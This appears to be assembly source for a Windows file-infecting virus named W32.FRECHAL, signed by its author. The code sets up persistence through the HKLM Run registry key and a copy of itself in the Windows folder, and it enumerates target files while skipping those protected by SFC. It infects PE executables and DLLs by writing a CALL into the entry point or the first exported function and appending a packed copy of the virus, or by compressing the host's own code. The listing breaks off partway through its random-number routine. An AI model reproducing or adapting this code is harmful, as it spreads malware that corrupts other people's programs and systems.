   ;              W32.FRECHAL      By: Weendigo

   .586p
   .model flat

   DEBUG equ yes

   include STRUC.INC

   .code

   _start:

   mov orig_esp, esp
   mov l_size, (offset l_end - offset l_start)
   call rnd_ini

   ;  decrypt pack engine header

   mov ecx, 256
   push offset aplib@006
   pop eax

   _ap_not:

   not byte ptr [eax]
   inc eax
   loop _ap_not

   x_push eax, Flechal~
   mov lpszSubKey_1, eax

   call _openmutex
   jnz _exit_com_del

   push NULL
   callx GetModuleHandleA

   test eax, eax
   jz _exit_com_del

   push MAX_PATH - 1
   push offset NAM_flechal
   push eax
   callx GetModuleFileNameA

   test eax, eax
   jz _exit_com_del

   ; try to retrieve our registry key
   ; and compare it with the current
   ; filename

   push eax
   mov ecx, esp
   push eax
   mov ebp, esp
   x_push eax, Software\Microsoft\Windows\CurrentVersion\Run~

   push ecx
   push ebp
   push 0
   push KEY_ALL_ACCESS
   push 0
   push 0
   push 0
   push eax
   push HKEY_LOCAL_MACHINE
   callx RegCreateKeyExA

   x_pop
   mov ebp, [ebp]
   sub esp, MAX_PATH - 8
   mov ebx, esp
   push MAX_PATH - 1
   mov eax, esp

   push eax
   push ebx
   push REG_NONE
   push NULL
   push [lpszSubKey_1]
   push ebp
   callx RegQueryValueExA

   pop ecx
   cmp eax, ERROR_SUCCESS
   jne __install

   ; compare strings

   push ebx
   push offset NAM_flechal
   callx lstrcmpi

   sub esp, - MAX_PATH

   test eax, eax
   jz _default

   call _openmutex
   jz _install

   _exit_com_del:

   ; wait 2 seconds and delete itself

   IFDEF DEBUG
   pushad
   x_push eax, EXIT~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   mov esp, orig_esp

   push -1
   callx ExitProcess

   __install:

   sub esp, - MAX_PATH  ;  RegQueryValueExA

   _install:

   ; we've to install flechal

   sub esp, MAX_PATH
   mov ebx, esp

   push MAX_PATH - 1
   push ebx
   callx GetWindowsDirectoryA

   push FALSE
   push ebx
   push offset NAM_flechal

   push ebx
   lea ebx, [eax+ebx]
   x_push esi, \COMMAND\NBKSULF.EXE~
   mov edi, ebx
   mov ecx, 21
   rep movsb
   x_pop
   pop ebx
   callx CopyFileA

   dec eax
   jz _copydone

   sub esp, - MAX_PATH
   jmp _exit_com_del

   _copydone:

   push ebx
   callx lstrlenA

   push eax
   push ebx
   push REG_SZ
   push NULL
   push [lpszSubKey_1]
   push ebp
   callx RegSetValueExA   

   push SW_SHOW
   push NULL
   push NULL
   push ebx
   push NULL
   push NULL
   callx ShellExecuteA

   _exit:

   mov esp, orig_esp

   push -1
   callx ExitProcess

   _default:

   sub eax, eax
   mov hWnd_imagehlp, eax
   mov hWnd_tmapi, eax

   x_push eax, _flechal1.0~
   push eax
   push TRUE
   push NULL
   callx CreateMutexA
   x_pop

   ;  we've to init some fields

   push offset NAM_flechal
   call _open_read

   test eax, eax
   jz _exit

   mov ecx, _file_size
   dec ecx
   push 0
   push offset workmem
   push ecx
   push offset _viral_temp_buffer_1 ;  output
   push eax
   call _ap_pack

   mov _viral_temp_sz, eax

   test eax, eax
   jz _exit

   IFDEF DEBUG
   x_push eax, D:\flechal\GOAT.DLL~
   push eax
   call _infect
   x_pop

   push -1
   callx ExitProcess

   pushad
   x_push eax, flechal1.0~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   x_push eax, TMAPI.DLL~
   push eax
   callx LoadLibraryA
   x_pop

   mov hWnd_tmapi, eax

   test eax, eax
   jz _out_tmapi

   x_push eax, InitTmTable~
   push eax
   push hWnd_tmapi
   callx GetProcAddress
   x_pop

   mov InitTmTable, eax

   test eax, eax
   jz _unloadtmapi

   x_push eax, GetTmElementByIndex~
   push eax
   push hWnd_tmapi
   callx GetProcAddress
   x_pop

   mov GetTmElementByIndex, eax

   test eax, eax
   jz _unloadtmapi

   x_push eax, CloseTmTable~
   push eax
   push hWnd_tmapi
   callx GetProcAddress
   x_pop

   mov CloseTmTable, eax

   test eax, eax
   jz _unloadtmapi

   IFDEF DEBUG
   pushad
   x_push eax, TMAPI.DLL|LOADED~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   mov index_tm, NULL

   call InitTmTable

   sub esp, MAX_PATH
   mov ebx, esp

   _search_via_tmapi:

   push ebx
   push 12345678h
   index_tm equ dword ptr $-4
   call GetTmElementByIndex

   inc index_tm

   test eax, eax
   jz _search_end

   ; infection routine here

   push ebx
   call _infect

   jmp _search_via_tmapi

   _search_end:

   call CloseTmTable

   IFDEF DEBUG
   pushad
   x_push eax, TMAPI.DLL|UNLOAD~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   sub esp, - MAX_PATH

   _unloadtmapi:

   push hWnd_tmapi
   callx FreeLibrary

   _out_tmapi:

   jmp _exit

   _openmutex:

   x_push eax, _flechal1.0~
   push eax
   push TRUE
   push 00100000h
   callx OpenMutexA
   x_pop

   test eax, eax
   ret

   _infect:

   push ebp
   mov ebp, esp
   pushad

   mov eax, [ebp+8]  ;  filename
   mov _current_fname, eax
   mov _sfc_flag, -1

   call rnd_eax
   mov _loader_fixed_random_value, eax

   IFDEF DEBUG
   pushad
   push 0
   push _current_fname
   push _current_fname
   push 0
   call [MessageBoxA]
   popad
   ENDIF

   push _current_fname
   call _open_read

   test eax, eax
   jz _infect_end

   mov edi, eax

   cmp _file_size, 1024 * 24
   jb _infect_end_1

   cmp _file_size, 1024 * 2400
   ja _infect_end_1

   x_push eax, IMAGEHLP.DLL~
   push eax
   callx LoadLibraryA
   x_pop

   mov hWnd_imagehlp, eax

   test eax, eax
   jz _infect_end_1

   x_push eax, ImageNtHeader~
   push eax
   push hWnd_imagehlp
   callx GetProcAddress
   x_pop

   mov ImageNtHeader, eax

   test eax, eax
   jz _infect_end_2

   x_push eax, ImageRvaToSection~
   push eax
   push hWnd_imagehlp
   callx GetProcAddress
   x_pop

   mov ImageRvaToSection, eax

   test eax, eax
   jz _infect_end_2

   x_push eax, ImageRvaToVa~
   push eax
   push hWnd_imagehlp
   callx GetProcAddress
   x_pop

   mov ImageRvaToVa, eax

   test eax, eax
   jz _infect_end_2

   IFDEF DEBUG
   pushad
   x_push eax, IMAGEHLP.DLL|LOADED~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   push edi
   call ImageNtHeader

   mov _image_nt_headers, eax

   test eax, eax
   jz _infect_end_2

   mov esi, eax

   ; GET GetProcAddress, GetModuleHandle/LoadLibrary import addresses
   ; if not found, skip infection

   call locate_import
   jz _infect_end_2

   IFDEF DEBUG
   pushad
   x_push eax, PE_IMAGE_FOUND~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   push [esi.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]
   pop _infect_entry_point

   push _infect_entry_point
   push edi
   push _image_nt_headers
   call ImageRvaToSection

   test eax, eax
   jz .2

   push eax
   call _check_know_section
   jnz _infect_end_2

   sub eax, edi

   .2:

   mov _infect_EP_section, eax

   ;  sfc ?

   x_push eax, SFC.DLL~
   push eax
   callx LoadLibraryA
   x_pop

   mov hWnd_sfc, eax

   test eax, eax
   jz _no_sfc

   x_push eax, SfcIsFileProtected~
   push eax
   push hWnd_sfc
   callx GetProcAddress
   x_pop

   mov SfcIsFileProtected, eax

   test eax, eax
   jz _unload_sfc

   push _current_fname
   push NULL
   call SfcIsFileProtected

   mov _sfc_flag, eax

   _unload_sfc:

   push hWnd_sfc
   callx FreeLibrary

   _no_sfc:

   sub eax, eax

   cmp eax, 12345678h
   _sfc_flag equ dword ptr $-4
   je _infect_end_2

   IFDEF DEBUG
   pushad
   x_push eax, SFC|OK~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   ;  saving usefull fields...

   call _biggest_rva
   jz _infect_end_2

   push eax
   push edi
   push _image_nt_headers
   call ImageRvaToSection

   test eax, eax
   jz _infect_end_2

   push eax

   sub eax, edi
   mov _infect_last_section, eax

   call _check_know_section
   jnz _infect_end_2

   ;  rva

   mov ecx, _infect_last_section
   add ecx, edi

   ;  CHANGES ON INFECTION TYPEs

   push [ecx.SH_VirtualAddress]
   pop _loader_memory_protect?

   mov eax, [ecx.SH_VirtualSize]
   cmp eax, [ecx.SH_SizeOfRawData]
   ja .8
   mov eax, [ecx.SH_SizeOfRawData]

   .8:

   mov _infect_flechal_rva, eax
   mov _infect_virtual_raw, eax

   test eax, eax
   jz _infect_end_2

   mov eax, [ecx.SH_PointerToRawData]
   add _infect_flechal_rva, eax

   test eax, eax
   jz _infect_end_2   

   mov eax, _infect_flechal_rva

   ;  if our RVA is very different from the original file size (plus than 4 Kb), we should avoid this infection
   ;  maybe this file is infected by another virus

   mov ecx, _file_size
   cmp eax, ecx
   ja .16

   xchg eax, ecx

   .16:

   sub eax, ecx
   cmp eax, 1024 * 4
   ja _infect_end_2

   IFDEF DEBUG2

   sub esp, MAX_PATH
   mov ebx, esp

   push _current_fname
   push ebx
   callx lstrcpyA

   push 'kab.'
   push esp
   push _current_fname
   callx lstrcatA

   push TRUE
   push ebx
   push _current_fname
   callx CopyFileA

   sub esp, - (MAX_PATH+4)

   ENDIF

   ;  export directory ?

   mov ecx, _image_nt_headers

   push [ecx.IMAGE_NT_HEADERS.OptionalHeader.DataDirectory\
   .(SIZE IMAGE_DATA_DIRECTORY*IMAGE_DIRECTORY_ENTRY_EXPORT).isize]
   pop _infect_export_sz

   mov eax, [ecx.IMAGE_NT_HEADERS.OptionalHeader.DataDirectory\
   .(SIZE IMAGE_DATA_DIRECTORY*IMAGE_DIRECTORY_ENTRY_EXPORT)\
   .VirtualAddress]
   mov _infect_export_dir_rva, eax

   test eax, eax
   jz _no_export

   IFDEF DEBUG
   pushad
   x_push eax, EXPORT_DIRECTORY_FOUND~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   cmp _infect_entry_point, 0
   jnz _valid_entry_point

   ;  export directory found
   ;  sfc protection not found
   ;  no entry-point (probably .DLL file)

   ;  we've to try to infect the first exported
   ;  function (replacing 5 first bytes by a "CALL VIRUS")

   ;  infection flag - 0

   nop

   mov _infect_mode_1, 0

   IFDEF DEBUG
   pushad
   x_push eax, INFECT|MD|0~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   push _infect_export_dir_rva
   call _rva_to_va

   mov _infect_export_dir_va, eax

   test eax, eax
   jz _infect_end_2

   xchg ecx, eax
   mov eax, [ecx.IMAGE_EXPORT_DIRECTORY.NumberOfFunctions]

   test eax, eax
   jz _infect_end_2

   push [ecx.IMAGE_EXPORT_DIRECTORY.AddressOfNames]
   call _rva_to_va

   test eax, eax
   jz _infect_end_2

   ;  get first one

   push dword ptr [eax]
   call _rva_to_va

   ;  name of function in EAX

   mov _infect_export_names, eax

   test eax, eax
   jz _infect_end_2

   IFDEF DEBUG
   pushad
   push 0 eax eax 0
   call [MessageBoxA]
   popad
   ENDIF

   push eax
   callx lstrlenA

   ;  Is this a valid function ?

   test eax, eax
   jz _infect_end_2

   ;  load this file/library...

   push _current_fname
   callx LoadLibraryA

   test eax, eax
   jz _infect_end_2

   mov hWnd_file_infect, eax

   push _infect_export_names
   push hWnd_file_infect
   callx GetProcAddress

   test eax, eax
   jz _infect_end_3

   cmp eax, hWnd_file_infect
   jb _infect_end_3

   sub eax, hWnd_file_infect
   mov _infect_lib_rva, eax

   push eax
   push edi
   push _image_nt_headers
   call ImageRvaToSection

   test eax, eax
   jz _infect_end_3

   push [eax.SH_VirtualSize]
   pop _replaced_api_section_sz

   push [eax.SH_VirtualAddress]
   pop _replaced_api_section

   push eax
   call _check_know_section
   jnz _infect_end_3

   ;  VA to function in EAX

   push _infect_lib_rva
   call _rva_to_va

   test eax, eax
   jz _infect_end_3

   push eax
   push 5
   push eax
   callx IsBadReadPtr

   test eax, eax
   pop eax
   jnz _infect_end_3

   ;  EAX points to the code of the first
   ;  exported function

   ;  now we need to know if
   ;  we have write access

   push _current_fname
   call _close_file

   ;  unload it from memory

   push hWnd_file_infect
   callx FreeLibrary

   push _current_fname
   call _open_write

   test eax, eax
   jz _infect_end_2

   ;  we've it...

   mov edi, eax

   push edi
   call ImageNtHeader

   mov _image_nt_headers, eax

   test eax, eax
   jz _infect_end_2

   push l_size ;  <---temporary - it'l be the poly loader size
   pop eax
   add eax, _viral_temp_sz
   mov _viral_pack_packet_sz, eax

   mov eax, _infect_lib_rva
   lea eax, [eax+edi]

   cmp byte ptr [eax], 0e8h
   je _infect_end_2

   mov esi, _infect_last_section
   add esi, edi
   mov ebp, _infect_virtual_raw
   mov _file_size, ebp
   mov eax, [esi.SH_PointerToRawData]
   add eax, _viral_pack_packet_sz
   add _file_size, eax

   call _re_size

   push edi
   call ImageNtHeader

   mov _image_nt_headers, eax

   push eax
   push edi

   mov esi, _infect_last_section
   add esi, edi

   mov [esi.SH_VirtualSize], ebp
   mov [esi.SH_SizeOfRawData], ebp

   push ebp

   add ebp, [esi.SH_VirtualAddress]
   mov _infect_flechal_rva, ebp
   mov _loader_memory_protect?_dif, ebp

   pop ebp
   add ebp, [esi.SH_PointerToRawData]

   ;  saving virus VA

   push ebp

   mov eax, _infect_lib_rva

   lea esi, [eax+edi]
   mov edi, offset _infect_orig_bytes  ;  **************************************************************************
   movsd
   movsb

   ;  original bytes'r safe, installing "CALL VIRUS"

   mov ecx, 5
   sub edi, ecx
   sub esi, ecx
   add eax, ecx
   mov ecx, _infect_flechal_rva
   sub ecx, eax
   mov edi, esi
   mov al, 0e8h
   stosb
   mov eax, ecx
   stosd   

   ;  ok, we need to add a loader to this file

   mov ebx, _infect_last_section
   add ebx, hWnd_MapViewOfFile
   mov ecx, _image_nt_headers

   push [ebx.SH_VirtualSize]
   push [ecx.IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment]
   call _re_align

   push eax
   push eax
   pop [ebx.SH_VirtualSize]
   pop _section_size

   push [ebx.SH_SizeOfRawData]
   push [ecx.IMAGE_NT_HEADERS.OptionalHeader.FileAlignment]
   call _re_align

   push eax
   pop [ebx.SH_SizeOfRawData]

   pop edi
   add edi, hWnd_MapViewOfFile
   mov esi, offset l_start ;  <---temporary - start of poly code
   mov ecx, l_size   ;  <---temporary - poly code 
   rep movsb

   mov esi, offset _viral_temp_buffer_1   ;  <---temporary - _viral_pack_packet_addr
   mov ecx, _viral_temp_sz ; <--temporary _viral_pack_packet_sz
   rep movsb

   ;  updating section / Image Size

   pop edi
   pop esi

   mov ebx, [ebx.SH_VirtualSize]
   add [esi.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage], ebx

   IFDEF DEBUG
   pushad
   x_push eax, DONE~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   jmp _infect_end_2

   _valid_entry_point:

   ;  export directory found
   ;  sfc protection not found
   ;  entry point found (maybe .DLL/.OCX file)

   ;  we've to try to infect this file replacing 5 first bytes at the entry-point (we cannot damage an exported
   ;  function compressing it)

   ;  infection flag - 1

   nop

   mov _infect_mode_1, 1

   IFDEF DEBUG
   pushad
   x_push eax, INFECT|MD|1~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   push _infect_entry_point
   call _rva_to_va

   mov esi, eax

   test eax, eax
   jz _infect_end_2

   mov eax, _infect_EP_section

   test eax, eax
   jz _infect_end_2

   add eax, edi

   push [eax.SH_VirtualSize]
   pop _replaced_api_section_sz

   push [eax.SH_VirtualAddress]
   pop _replaced_api_section

   push edi

   mov edi, offset _infect_orig_bytes  ;  **************************************************************************
   mov ecx, 5
   movsb
   movsd

   pop edi
   push eax
   call _check_know_section
   jnz _infect_end_2

   ;  ok, let's ...

   mov al, byte ptr [esi-5]
   sub al, 0e8h
   jz _infect_end_2
   sub al, 0e9h - 0e8h
   jz _infect_end_2

   mov ebp, _infect_last_section
   add ebp, edi

   push _current_fname
   call _close_file

   push _current_fname
   call _open_write

   test eax, eax
   jz _infect_end_2

   ;  EBP - last section header

   mov eax, _infect_virtual_raw
   add eax, [ebp.SH_VirtualAddress]

   ;  RVA virus

   mov _loader_memory_protect?_dif, eax

   push _infect_flechal_rva
   pop _file_size

   call _poly_fields

   add _file_size, eax

   call _re_size

   test edi, edi
   jz _infect_end_2

   push edi
   call ImageNtHeader

   mov _image_nt_headers, eax
   mov esi, eax

   test eax, eax
   jz _infect_end_2

   mov ebx, _infect_last_section
   add ebx, edi
   push edi

   push _infect_virtual_raw
   push _infect_virtual_raw

   pop [ebx.SH_VirtualSize]
   pop [ebx.SH_SizeOfRawData]

   push [ebx.SH_VirtualSize]
   push [esi.IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment]
   call _re_align

   push eax
   push eax

   pop [ebx.SH_VirtualSize]
   pop _section_size

   push [ebx.SH_SizeOfRawData]
   push [esi.IMAGE_NT_HEADERS.OptionalHeader.FileAlignment]
   call _re_align

   push eax
   pop [ebx.SH_SizeOfRawData]

   push _infect_entry_point
   call _rva_to_va

   mov edi, eax

   mov eax, _infect_entry_point
   sub eax, -5
   mov ecx, _infect_virtual_raw
   add ecx, [ebx.SH_VirtualAddress]
   sub ecx, eax
   mov al, 0e8h
   stosb
   mov eax, ecx
   stosd

   pop edi
   push edi

   add edi, _infect_flechal_rva
   mov esi, offset l_start ;  <---temporary - start of poly code
   mov ecx, l_size   ;  <---temporary - poly code 
   rep movsb   ;  00401bdc

   mov esi, offset _viral_temp_buffer_1   ;  <---temporary - _viral_pack_packet_addr
   mov ecx, _viral_temp_sz ; <--temporary _viral_pack_packet_sz
   rep movsb

   pop edi
   mov esi, _image_nt_headers

   mov eax, [ebx.SH_VirtualSize]
   add [esi.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage], eax

   IFDEF DEBUG
   pushad
   x_push eax, DONE~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   jmp _infect_end_2

   _no_export:

   IFDEF DEBUG
   pushad
   x_push eax, EXPORT_DIRECTORY_NOT_FOUND~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   cmp _infect_entry_point, 0
   jz _infect_end_2

   ;  export directory not found
   ;  sfc protection not found
   ;  entry point found (probably .EXE file)

   ;  we've to try to infect this file compressing
   ;  from the entry-point to the end of the section
   ;  keeping the original file size

   ;  infection flag - 2

   nop

   mov _infect_mode_1, 2

   IFDEF DEBUG
   pushad
   x_push eax, INFECT|MD|2~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   push _infect_entry_point
   pop __entry
   push _infect_entry_point
   pop _loader_memory_protect?_dif

   mov ecx, _infect_EP_section
   test ecx, ecx
   jz _infect_end_2

   add ecx, edi
   mov eax, [ecx.SH_SizeOfRawData]

   cmp eax, 16 * 1024   ;  min. size
   jb _infect_end_2

   mov esi, ecx

   ;  ESI points to the section header from
   ;  entrypoint

   mov ecx, _infect_entry_point
   mov eax, [esi.SH_VirtualAddress]
   add eax, [esi.SH_SizeOfRawData]
   sub eax, ecx

   ;  enough space to compress ?

   cmp eax, (16 * 1024)
   jb _infect_end_2

   cmp eax, (500 * 1024)
   ja _infect_end_2

   mov _mem_total, eax
   mov _infect_compress_space_1, eax

   push [esi.SH_VirtualSize]
   pop _section_size
   push [esi.SH_VirtualAddress]
   pop _loader_memory_protect?

   push ecx
   call _rva_to_va

   ;  compression starts here

   mov ebx, eax

   test eax, eax
   jz _infect_end_2

   mov eax, _infect_compress_space_1
   add eax, 4096

   push eax
   push 40h
   callx GlobalAlloc

   mov _infect_compress_addr_1, eax

   test eax, eax
   jz _infect_end_2

   push 0
   push offset workmem
   push _infect_compress_space_1
   push _infect_compress_addr_1
   push ebx
   call _ap_pack

   mov _infect_compress_space_2, eax

   test eax, eax
   jz _infect_end_4

   ;  we need to generate a poly loader
   ;  and adjust some offsets

   call _poly_fields

   mov ecx, _infect_compress_space_1   ;  size to pack

   cmp _infect_compress_space_2, ecx
   ja _infect_end_4

   sub ecx, _infect_compress_space_2
   cmp ecx, eax
   jb _infect_end_4

   IFDEF DEBUG
   pushad
   x_push eax, try|to|infect|?~
   push 1
   push eax
   push _current_fname
   push 0
   call [MessageBoxA]
   x_pop
   cmp eax, 2
   popad
   je _infect_end_4
   ENDIF

   push _current_fname
   call _close_file

   push _current_fname
   call _open_write

   test eax, eax
   jz _infect_end_4

   mov edi, eax

   push edi
   call ImageNtHeader

   mov _image_nt_headers, eax

   test eax, eax
   jz _infect_end_4

   push _infect_entry_point
   call _rva_to_va

   push edi

   push l_size
   pop ecx

   add _mem_total, ecx  ;  <---temporary - poly code 

   mov edi, eax
   mov esi, offset l_start ;  <---temporary - start of poly code
   rep movsb

   mov esi, _infect_compress_addr_1
   mov ecx, _infect_compress_space_2
   rep movsb

   mov esi, offset _viral_temp_buffer_1   ;  <---temporary - _viral_pack_packet_addr
   mov ecx, _viral_temp_sz ; <--temporary _viral_pack_packet_sz
   rep movsb

   pop edi

   IFDEF DEBUG
   pushad
   x_push eax, DONE~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   _infect_end_4:

   push _infect_compress_addr_1
   callx GlobalFree

   jmp _infect_end_2

   _infect_end_3:

   push hWnd_file_infect
   callx FreeLibrary

   _infect_end_2:

   push hWnd_imagehlp
   callx FreeLibrary

   _infect_end_1:

   push _current_fname
   call _close_file

   _infect_end:

   IFDEF DEBUG
   pushad
   x_push eax, INFECT|ROUTINE|END~
   push 0 eax eax 0
   call [MessageBoxA]
   x_pop
   popad
   ENDIF

   popad
   pop ebp
   ret (4*1)

   _current_fname dd -1

   _poly_fields:

   pushad
   push l_size ;  <---temporary - it'l be the poly loader size
   pop eax
   add eax, _viral_temp_sz
   mov _viral_pack_packet_sz, eax

   mov [esp+(4*7)], eax
   popad
   ret

   _check_know_section:

   push ebp
   mov ebp, esp
   pushad

   mov esi, [ebp+8]
   x_push edi, .text~CODE~.code~DATA~.data~.rdata~.sdata~.idata~.edata~.rsrc~.reloc~.debug~
   mov ecx, 12

   cmp_section:

   push ecx
   push edi
   push esi
   callx lstrcmpi

   push eax
   push edi
   callx lstrlen

   inc eax
   add edi, eax
   pop eax
   pop ecx

   test eax, eax
   jz end_cmp_section

   loop cmp_section

   mov eax, -1

   end_cmp_section:  ;  00401d05

   IFDEF DEBUG
   pushad
   test eax, eax
   jnz .64
   push 0 esi esi 0
   call [MessageBoxA]
   .64:
   popad
   ENDIF

   x_pop
   test eax, eax
   popad
   pop ebp
   ret (4*1)

   _cmp_1:

   mov eax, [ebp]

   push ecx
   push eax
   call _rva_to_va
   pop ecx

   test eax, eax
   jz _cmp_ret

   add eax, 2

   ;  EAX points to the first imported function

   push ecx
   push eax
   push _look_4_function
   callx lstrcmp
   pop ecx

   add ebp, 4
   inc ecx

   test eax, eax
   jnz _cmp_1

   IFDEF DEBUG
   pushad
   push 0
   push _look_4_function
   push _look_4_function
   push 0
   call [MessageBoxA]
   popad
   ENDIF

   dec ecx

   mov eax, _import_function
   lea ecx, [ecx*4]
   add eax, ecx
   mov ecx, _image_nt_headers
   add eax, [ecx.IMAGE_NT_HEADERS.OptionalHeader.ImageBase]

   ;  Runtime address of function in [EAX]

   _cmp_ret:

   ret

   _rva_to_va:

   push ebp
   mov ebp, esp
   pushad

   mov eax, [ebp+8]

   push NULL
   push eax
   push edi
   push _image_nt_headers
   call ImageRvaToVa

   mov [esp+(4*7)], eax
   popad
   pop ebp
   ret (1*4)

   _re_size:

   push eax
   push _current_fname
   call _close_file

   push _current_fname
   call _open_write

   mov edi, eax
   pop eax
   ret

   _re_align:

   ;  _re_align (alignment, value)

   push ecx
   push edx

   mov eax, [esp+16]
   sub edx, edx
   add eax, _viral_pack_packet_sz
   mov ecx, [esp+12]
   div ecx
   inc eax
   sub edx, edx
   mul ecx

   pop edx
   pop ecx
   ret (4*2)

   _biggest_rva:

   ;  return pointer to section with the biggest
   ;  RVA

   push ebp
   mov ebp, esp
   pushad

   sub eax, eax
   mov edi, _image_nt_headers
   movzx ecx, [edi.IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
   jecxz _biggest_rva_end
   lea edi, [edi+SIZE IMAGE_NT_HEADERS]

   _rva_loop:

   cmp eax, [edi.SH_VirtualAddress]
   ja _rva_loop_1
   mov eax, [edi.SH_VirtualAddress]

   _rva_loop_1:

   add edi, SIZE IMAGE_SECTION_HEADER
   dec ecx
   test ecx, ecx
   jz _biggest_rva_end
   mov edx, [edi.SH_VirtualAddress]
   cmp eax, edx
   ja _rva_loop
   xchg eax, edx
   jmp _rva_loop

   _biggest_rva_end:

   mov _infect_biggest_rva, eax
   mov [esp+(4*7)], eax
   test eax, eax
   popad
   pop ebp
   ret

   _open_read:

   sub eax, eax
   mov _file_size, eax
   mov _create_flag, OPEN_EXISTING
   mov _access_type, GENERIC_READ
   mov _map_access_type, PAGE_READONLY
   mov _mview_access_type, FILE_MAP_READ
   jmp short _open

   _open_create:

   mov _create_flag, CREATE_ALWAYS
   mov _access_type, GENERIC_READ or GENERIC_WRITE
   mov _map_access_type, PAGE_READWRITE
   mov _mview_access_type, FILE_MAP_WRITE
   jmp short _open

   _open_write:

   sub eax, eax
   mov _file_size, eax
   mov _create_flag, OPEN_EXISTING
   mov _access_type, GENERIC_READ or GENERIC_WRITE
   mov _map_access_type, PAGE_READWRITE
   mov _mview_access_type, FILE_MAP_WRITE

   _open:

   push ebp
   mov ebp, esp
   pushad

   mov _file_attrib, FILE_ATTRIBUTE_NORMAL
   mov esi, [ebp+8]

   push esi
   callx GetFileAttributesA

   inc eax
   jz _set_normal
   dec eax
   mov _file_attrib, eax

   sub eax, FILE_ATTRIBUTE_DIRECTORY
   jz _io_end

   sub eax, FILE_ATTRIBUTE_COMPRESSED - FILE_ATTRIBUTE_DIRECTORY
   jz _io_end

   _set_normal:

   push FILE_ATTRIBUTE_NORMAL
   push esi
   callx SetFileAttributesA

   push 0
   push 0
   push _create_flag
   push 0
   push FILE_SHARE_READ
   push _access_type
   push esi
   callx CreateFileA

   mov hWnd_CreateFile, eax

   inc eax
   jz _close_1

   mov eax, offset _file_time
   push eax
   sub eax, - 8
   push eax
   add eax, 8
   push eax
   push hWnd_CreateFile
   callx GetFileTime

   dec eax
   jnz _close_2

   cmp _create_flag, CREATE_ALWAYS
   je _map

   push eax
   push hWnd_CreateFile
   callx GetFileSize

   mov _file_size, eax

   inc eax
   jz _close_3

   _map:

   sub eax, eax

   push eax
   push _file_size
   push eax
   push _map_access_type
   push eax
   push hWnd_CreateFile
   callx CreateFileMappingA

   mov hWnd_CreateFileMapping, eax

   test eax, eax
   jz _close_3

   sub eax, eax

   push _file_size
   push eax
   push eax
   push _mview_access_type
   push hWnd_CreateFileMapping
   callx MapViewOfFile

   mov hWnd_MapViewOfFile, eax

   test eax, eax
   jz _close_4

   _io_end:

   mov [esp+(4*7)], eax
   popad
   pop ebp
   ret (1*4)

   _close_file:

   push ebp
   mov ebp, esp
   pushad

   mov esi, [ebp+8]

   push hWnd_MapViewOfFile
   callx UnmapViewOfFile

   _close_4:

   push hWnd_CreateFileMapping
   callx CloseHandle

   sub eax, eax

   push FILE_BEGIN
   push eax
   push _file_size
   push hWnd_CreateFile
   callx SetFilePointer

   push hWnd_CreateFile
   callx SetEndOfFile

   _close_3:

   mov eax, offset _file_time
   push eax
   add eax, 8
   push eax
   sub eax, - 8
   push eax
   push hWnd_CreateFile
   callx SetFileTime

   _close_2:

   push hWnd_CreateFile
   callx CloseHandle

   _close_1:

   push _file_attrib
   push esi
   callx SetFileAttributesA

   sub eax, eax
   jmp _io_end

   locate_import:

   pushad
   mov ecx, _image_nt_headers
   mov eax, [ecx.IMAGE_NT_HEADERS.OptionalHeader.DataDirectory\
   .(SIZE IMAGE_DATA_DIRECTORY*IMAGE_DIRECTORY_ENTRY_IMPORT)\
   .VirtualAddress]

   mov _infect_import_dir_rva, eax

   push eax
   call _rva_to_va

   test eax, eax
   jz end_locate_import

   mov esi, eax

   _find_kernel:

   push [esi.Name1]
   call _rva_to_va

   test eax, eax
   jz end_locate_import

   add esi, SIZE IMAGE_IMPORT_DESCRIPTOR

   mov ecx, not 'NREK'
   not ecx

   cmp [eax], ecx
   jne _find_kernel

   sub esi, SIZE IMAGE_IMPORT_DESCRIPTOR

   mov ecx, esi
   sub ecx, edi

   mov _kernel_import_va, ecx

   mov eax, [esi.FirstThunk]
   mov _import_function, eax

   test eax, eax
   jz end_locate_import

   mov eax, [esi.OriginalFirstThunk]

   push eax
   call _rva_to_va

   push eax
   push dword ptr [eax]
   call _rva_to_va
   test eax, eax
   pop eax
   jz _find_function_1

   test eax, eax
   jnz _find_function

   _find_function_1:

   mov eax, [esi.FirstThunk]
   mov _import_function, eax

   push eax
   call _rva_to_va

   push eax
   push dword ptr [eax]
   call _rva_to_va
   test eax, eax
   pop eax
   jz end_locate_import

   test eax, eax
   jz end_locate_import

   _find_function:

   mov ebp, eax

   push ebp
   sub ecx, ecx
   x_push eax, GetProcAddress~
   mov _look_4_function, eax
   call _cmp_1
   x_pop
   pop ebp
   mov _import_GetProcAddress, eax
   test eax, eax
   jz end_locate_import

   push ebp
   sub ecx, ecx
   x_push eax, GetModuleHandleA~
   mov _look_4_function, eax
   call _cmp_1
   x_pop
   pop ebp
   mov _import_GetKernel, eax
   test eax, eax
   jnz end_locate_import

   push ebp
   sub ecx, ecx
   x_push eax, LoadLibraryA~
   mov _look_4_function, eax
   call _cmp_1
   x_pop
   pop ebp
   mov _import_GetKernel, eax

   end_locate_import:

   mov [esp+(4*7)], eax
   popad
   ret

   include PACKER.INC

   rnd_ini:

   callx GetTickCount
   mov ecx, eax

   rnd_ini_loop_1:
